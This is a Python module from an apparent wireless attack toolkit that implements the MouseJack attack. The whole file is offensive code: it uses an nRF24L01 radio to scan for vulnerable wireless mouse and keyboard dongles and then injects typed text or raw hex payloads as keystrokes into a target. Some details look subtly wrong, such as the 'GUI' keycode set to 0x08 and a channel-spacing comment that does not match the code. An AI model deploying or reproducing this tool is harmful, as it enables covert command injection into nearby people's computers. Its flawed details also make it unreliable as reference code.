# modules/wireless/mousejack.py
# MouseJack attack — injects keystrokes into unencrypted wireless
# mice and keyboards (Logitech Unifying, many cheap 2.4GHz devices).
#
# References: https://www.mousejack.com
# Affected: Most non-Bluetooth wireless mice/keyboards made before ~2016,
#           many cheap ones still sold today.
#
# Two steps:
#   1. scan()   — find vulnerable dongles nearby
#   2. inject() — send keystrokes to a discovered target

import time

_running = False

def stop():
    global _running
    _running = False

# ── HID keycodes ─────────────────────────────────────────────────────────────
# Subset of USB HID keycodes for building injection payloads
KEYCODES = {
    "a":0x04,"b":0x05,"c":0x06,"d":0x07,"e":0x08,"f":0x09,"g":0x0A,"h":0x0B,
    "i":0x0C,"j":0x0D,"k":0x0E,"l":0x0F,"m":0x10,"n":0x11,"o":0x12,"p":0x13,
    "q":0x14,"r":0x15,"s":0x16,"t":0x17,"u":0x18,"v":0x19,"w":0x1A,"x":0x1B,
    "y":0x1C,"z":0x1D,"1":0x1E,"2":0x1F,"3":0x20,"4":0x21,"5":0x22,"6":0x23,
    "7":0x24,"8":0x25,"9":0x26,"0":0x27," ":0x2C,"\n":0x28,"ENTER":0x28,
    "BACKSPACE":0x2A,"TAB":0x2B,"ESCAPE":0x29,"GUI":0x08,"WIN":0x08,
}
MOD_SHIFT = 0x02
MOD_CTRL  = 0x01
MOD_ALT   = 0x04
MOD_GUI   = 0x08   # Windows/Super key


def _make_payload(keycode=0x00, modifier=0x00):
    """Build a MouseJack HID injection payload (32 bytes)."""
    pkt = bytearray(32)
    pkt[0] = 0x00   # device index
    pkt[1] = 0xC1   # HID type: keyboard
    pkt[2] = modifier
    pkt[3] = 0x00   # reserved
    pkt[4] = keycode
    return bytes(pkt)


def _make_release():
    """Key release packet."""
    return _make_payload(0x00, 0x00)


def scan(log=print, scan_time=10):
    """
    Scan for vulnerable wireless dongles.
    Listens on each channel for the ESB (Enhanced ShockBurst) ping pattern
    used by Logitech Unifying and similar receivers.
    Returns list of (channel, address) tuples.
    """
    global _running

    try:
        from pyrf24 import RF24, RF24_PA_LOW, RF24_2MBPS, RF24_CRC_DISABLED
    except ImportError:
        log("[ERROR] pyrf24 not installed.")
        return []

    CE_PIN  = 22
    CSN_PIN = 0
    radio   = RF24(CE_PIN, CSN_PIN)

    if not radio.begin():
        log("[ERROR] nRF24L01 not detected.")
        return []

    radio.setAutoAck(False)
    radio.setDataRate(RF24_2MBPS)
    radio.setCRCLength(RF24_CRC_DISABLED)
    radio.setPayloadSize(32)
    radio.setPALevel(RF24_PA_LOW)

    # Logitech Unifying uses 2MHz spacing starting at channel 5
    # and a set of known addresses
    logitech_channels = list(range(5, 84, 3))   # 5,8,11,14...
    promiscuous_addr  = bytes.fromhex("AAAAAAAAAAAA"[:10])  # 5-byte promisc

    log(f"[*] Scanning for vulnerable dongles ({scan_time}s)...")
    log(f"[*] Checking {len(logitech_channels)} Logitech channels...")

    found   = []
    _running = True
    end_time = time.time() + scan_time

    try:
        while _running and time.time() < end_time:
            for ch in logitech_channels:
                if not _running:
                    break
                radio.setChannel(ch)
                radio.setAddressWidth(5)
                radio.openReadingPipe(1, promiscuous_addr)
                radio.startListening()
                time.sleep(0.001)

                if radio.available():
                    payload = radio.read(32)
                    hex_str = " ".join(f"{b:02X}" for b in payload[:10])
                    freq    = 2400 + ch
                    log(f"[+] Activity on channel {ch} ({freq} MHz): {hex_str}...")

                    entry = (ch, hex_str)
                    if entry not in found:
                        found.append(entry)

                radio.stopListening()

    finally:
        radio.powerDown()

    if found:
        log(f"[*] Found {len(found)} potential target(s).")
    else:
        log("[*] No vulnerable dongles found nearby.")

    return found


def inject(log=print, channel=62, address="DC8770D594", text="", payload_hex=""):
    """
    Inject keystrokes into a target dongle.
    channel:     nRF channel of the target (from scan())
    address:     5-byte target address hex string (from scan())
    text:        plain text string to type (e.g. "hello world")
    payload_hex: raw hex payload to send instead of text (advanced)
    """
    global _running

    try:
        from pyrf24 import RF24, RF24_PA_MAX, RF24_2MBPS
    except ImportError:
        log("[ERROR] pyrf24 not installed.")
        return

    CE_PIN  = 22
    CSN_PIN = 0
    radio   = RF24(CE_PIN, CSN_PIN)

    if not radio.begin():
        log("[ERROR] nRF24L01 not detected.")
        return

    try:
        addr_bytes = bytes.fromhex(address)
    except ValueError:
        log(f"[ERROR] Invalid address: {address}")
        return

    radio.setChannel(channel)
    radio.setPayloadSize(32)
    radio.setAddressWidth(len(addr_bytes))
    radio.openWritingPipe(addr_bytes)
    radio.setAutoAck(False)
    radio.setRetries(0, 0)
    radio.setPALevel(RF24_PA_MAX)
    radio.setDataRate(RF24_2MBPS)
    radio.stopListening()

    freq = 2400 + channel
    log(f"[*] Injecting into channel {channel} ({freq} MHz)")
    log(f"[*] Target address: {address}")

    _running = True

    try:
        if payload_hex:
            # Raw payload mode
            try:
                raw = bytes.fromhex(payload_hex.replace(" ", ""))
                raw = raw.ljust(32, b"\x00")[:32]
            except ValueError:
                log(f"[ERROR] Invalid hex payload: {payload_hex}")
                return
            ok = radio.write(raw)
            log(f"  Raw payload: {'OK' if ok else 'FAILED'}")

        elif text:
            log(f"[*] Typing: {repr(text)}")
            for char in text:
                if not _running:
                    break
                c = char.lower()
                modifier = 0
                if char.isupper():
                    modifier = MOD_SHIFT
                # Special chars that need shift
                if char in "!@#$%^&*()_+{}|:\"<>?~":
                    modifier = MOD_SHIFT

                keycode = KEYCODES.get(c, 0)
                if keycode == 0 and char not in KEYCODES:
                    log(f"  [!] Unknown char: {repr(char)}, skipping")
                    continue

                # Send keydown
                pkt = _make_payload(keycode, modifier)
                radio.write(pkt)
                time.sleep(0.005)

                # Send keyup
                radio.write(_make_release())
                time.sleep(0.005)

            log("[*] Injection complete.")
        else:
            log("[!] No text or payload provided.")

    finally:
        radio.powerDown()


def run(log=print, mode="scan", channel=62, address="DC8770D594",
        text="", payload_hex="", scan_time=10):
    """Called by the UI worker thread."""
    if mode == "scan":
        scan(log=log, scan_time=scan_time)
    elif mode == "inject":
        inject(log=log, channel=channel, address=address,
               text=text, payload_hex=payload_hex)
